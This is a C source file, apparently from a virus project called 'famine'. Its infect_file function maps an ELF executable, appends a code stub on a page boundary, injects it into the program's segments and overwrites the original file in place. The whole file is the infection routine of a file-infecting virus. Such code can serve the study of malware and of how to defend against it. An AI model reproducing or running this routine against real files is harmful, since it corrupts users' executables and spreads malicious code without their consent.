#include "../include/famine.h"

int infect_file(const char *path)
{
	t_famine	f;
	struct stat st;
	void		*map;
	int			fd;

	fd = open(path, O_RDONLY);
	if (fd < 0)
		return (LOG("open(%s) failed\n", path), 1);
	if (fstat(fd, &st) < 0 || st.st_size < (off_t)sizeof(Elf64_Ehdr))
		return (LOG("fstat/size check failed\n"), close(fd), 1);

	map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	close(fd);
	if (map == MAP_FAILED)
		return (LOG("mmap failed\n"), 1);
	if (!is_valid_elf((Elf64_Ehdr *)map))
		return (munmap(map, st.st_size), 1);

	f.stub_offset = (st.st_size + PAGE_SIZE - 1) & ~((size_t)PAGE_SIZE - 1);
	f.out_size = f.stub_offset + stub_bin_len;
	f.out = malloc(f.out_size);
	if (!f.out)
		return (munmap(map, st.st_size), 1);
	memset(f.out, 0, f.out_size);
	memcpy(f.out, map, st.st_size);
	munmap(map, st.st_size);

	f.ehdr = (Elf64_Ehdr *)f.out;
	f.phdr = (Elf64_Phdr *)(f.out + f.ehdr->e_phoff);
	if (find_segments(&f))
		return (free(f.out), 1);

	inject_stub(&f);

	fd = open(path, O_WRONLY | O_TRUNC, st.st_mode & 07777);
	if (fd < 0)
		return (LOG("open(%s) for write failed\n", path), free(f.out), 1);
	if (write(fd, f.out, f.out_size) != (ssize_t)f.out_size)
		return (LOG("write failed\n"), close(fd), free(f.out), 1);
	close(fd);
	free(f.out);
	return (0);
}
